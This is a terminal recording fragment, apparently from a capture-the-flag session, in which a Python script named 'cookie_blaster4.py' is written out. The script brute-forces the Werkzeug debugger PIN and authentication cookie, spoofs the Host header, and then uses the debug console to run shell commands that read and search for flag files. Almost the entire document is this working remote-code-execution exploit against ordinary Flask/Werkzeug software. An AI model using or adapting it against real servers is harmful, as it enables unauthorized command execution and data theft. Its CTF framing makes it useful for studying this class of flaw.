[2393.776138, "i", "cat << 'EOF' > cookie_blaster4.py\nimport hashlib, requests\nfrom itertools import chain\nimport concurrent.futures\n\nurl = \"http://target:8127/console\"\nsecret = \"cROx4oCXXz5PA5qlhIU3\"\nmac = \"2485377892356\"\nboot_id = 'df37f78a-cf41-4eae-9e39-a834a92a596a'\n\nusernames = ['root', 'app', 'ctf', 'werkzeug', 'nobody', 'www-data', 'daemon']\nmodnames = ['flask.app', 'werkzeug.debug', '__main__', 'app']\nappnames = ['Flask', 'DebuggedApplication', 'wsgi_app', 'app']\npaths = [\n    '/usr/local/lib/python3.11/site-packages/flask/app.py',\n    '/usr/lib/python3.11/site-packages/flask/app.py',\n    '/usr/lib/python3.11/dist-packages/flask/app.py',\n    '/usr/local/lib/python3.11/dist-packages/flask/app.py',\n    '/app/venv/lib/python3.11/site-packages/flask/app.py',\n    '/usr/local/lib/python3.11/site-packages/werkzeug/debug/__init__.py',\n    '/usr/lib/python3.11/site-packages/werkzeug/debug/__init__.py',\n    '/app/app.py', '/app/main.py'\n]\nmachine_ids = [boot_id, boot_id + '0::/']\n\ncookies_to_test = []\n\nfor u in usernames:\n    for m1 in modnames:\n        for m2 in appnames:\n            for m3 in paths:\n                for mid in machine_ids:\n                    for algo in [hashlib.md5, hashlib.sha1, hashlib.sha256]:\n                        try:\n                            h = algo()\n                            for bit in chain([u, m1, m2, m3], [mac, mid]):\n                                if not bit: continue\n                                if isinstance(bit, str): bit = bit.encode('utf-8')\n                                h.update(bit)\n                            h_name = h.copy()\n                            h_name.update(b'cookiesalt')\n                            cookie_name = f\"__wzd{h_name.hexdigest()[:20]}\"\n\n                            h_pin = h.copy()\n                            h_pin.update(b'pinsalt')\n                            num = f\"{int(h_pin.hexdigest(), 16):09d}\"[:9]\n                            pin = f\"{num[:3]}-{num[3:6]}-{num[6:9]}\"\n\n                            for cval_algo in [hashlib.md5, hashlib.sha1, hashlib.sha256]:\n                                c_val = cval_algo(f\"{pin} pallets\".encode('utf-8')).hexdigest()\n                                cookies_to_test.append((cookie_name, c_val))\n                        except Exception:\n                            pass\n\nprint(\"Total payloads:\", len(cookies_to_test))\nchunk_size = 50\nchunks = [dict(cookies_to_test[i:i+chunk_size]) for i in range(0, len(cookies_to_test), chunk_size)]\n\ndef test_chunk(chunk):\n    r = requests.get(url, params={\"__debugger__\": \"yes\", \"cmd\": \"print('PWN_9X')\", \"frm\": \"0\", \"s\": secret}, headers={\"Host\": \"localhost\"}, cookies=chunk)\n    if 'PWN_9X' in r.text:\n        for k, v in chunk.items():\n            r2 = requests.get(url, params={\"__debugger__\": \"yes\", \"cmd\": \"print('WIN_5Y')\", \"frm\": \"0\", \"s\": secret}, headers={\"Host\": \"localhost\"}, cookies={k: v})\n            if 'WIN_5Y' in r2.text:\n                print(f\"\\n[*] EXPLOIT SUCCESS VIA {k}={v}\")\n                cmd = \"import os; print(os.popen('cat /flag.txt 2>/dev/null; cat /app/flags.txt 2>/dev/null; find / -name \\\"*flag*\\\" 2>/dev/null | xargs -r cat 2>/dev/null').read())\"\n                r3 = requests.get(url, params={\"__debugger__\": \"yes\", \"cmd\": cmd, \"frm\": \"0\", \"s\": secret}, headers={\"Host\": \"localhost\"}, cookies={k: v})\n                print(\"FLAG OUTPUT:\", r3.text)\n                return True\n    return False\n\nwith concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:\n    for _ in ex.map(test_chunk, chunks):\n        pass\nEOF\n"]
